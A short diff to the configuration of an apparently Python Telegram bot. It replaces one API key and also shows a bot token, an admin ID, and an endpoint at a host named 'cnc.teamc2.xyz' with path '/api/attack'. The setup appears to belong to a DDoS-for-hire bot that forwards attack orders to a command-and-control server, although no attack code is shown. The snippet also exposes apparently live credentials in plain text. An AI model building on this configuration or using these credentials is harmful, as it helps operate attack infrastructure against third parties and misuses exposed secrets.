@@ -15,7 +15,7 @@ from collections import defaultdict
 BOT_TOKEN = "8760406918:AAHhsW-LvW5ZdDkRFGMCJ2EDL9YEiwuZCR8"
 ADMIN_ID = ["8487946379"]
 API_URL = "http://cnc.teamc2.xyz:5001/api/attack"
-API_KEY = "PFC10J"
+API_KEY = "WTRMWL"
 MAX_CONCURRENT = 2
 COOLDOWN_TIME = 30
 
